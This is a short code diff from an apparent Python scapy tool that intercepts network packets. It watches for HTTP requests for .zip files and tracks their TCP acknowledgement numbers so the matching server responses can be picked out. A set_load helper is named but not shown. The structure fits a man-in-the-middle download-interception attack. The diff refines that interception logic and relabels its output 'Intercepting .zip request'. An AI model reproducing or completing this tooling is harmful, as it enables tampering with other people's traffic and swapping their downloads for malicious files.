@@ -18,10 +18,10 @@ def set_load(packet, load):
 
 def process_packet(packet):
     scapy_packet = inet.IP(packet.get_payload())
-    if scapy_packet.haslayer(scapy.Raw):
+    if scapy_packet.haslayer(scapy.Raw) and scapy_packet.haslayer(inet.TCP):
         if scapy_packet[inet.TCP].dport == 80:
             if ".zip" in scapy_packet[scapy.Raw].load.decode():
-                print(".zip request")
+                print("Intercepting .zip request")
                 ack_list.append(scapy_packet[inet.TCP].ack)
         elif scapy_packet[inet.TCP].sport == 80:
             if scapy_packet[inet.TCP].seq in ack_list:
